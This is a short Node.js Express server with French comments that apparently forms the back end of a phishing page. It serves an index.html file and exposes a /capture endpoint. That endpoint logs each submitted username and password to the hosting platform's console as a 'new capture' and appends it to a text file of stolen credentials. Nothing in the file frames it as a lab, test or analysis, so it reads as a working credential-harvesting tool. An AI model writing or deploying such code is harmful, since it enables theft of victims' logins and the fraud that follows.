const express = require('express');
const fs = require('fs');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());
app.use(express.static(__dirname));

app.post('/capture', (req, res) => {
    const { username, password } = req.body;

    // Mise en forme pour les logs
    const logEntry = `
==========================================
NOUVELLE CAPTURE :
Utilisateur : ${username}
Mot de passe : ${password}
Date        : ${new Date().toLocaleString()}
==========================================
`;

    // 1. Affiche DIRECTEMENT dans les logs Railway
    console.log(logEntry);

    // 2. Écrit aussi dans le fichier .txt (facultatif)
    fs.appendFile(path.join(__dirname, 'identifiants.txt'), logEntry, (err) => {
        if (err) console.error("Erreur d'écriture fichier:", err);
    });

    res.status(200).send("OK");
});

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.listen(PORT, () => {
    console.log(`Serveur actif sur le port ${PORT}`);
});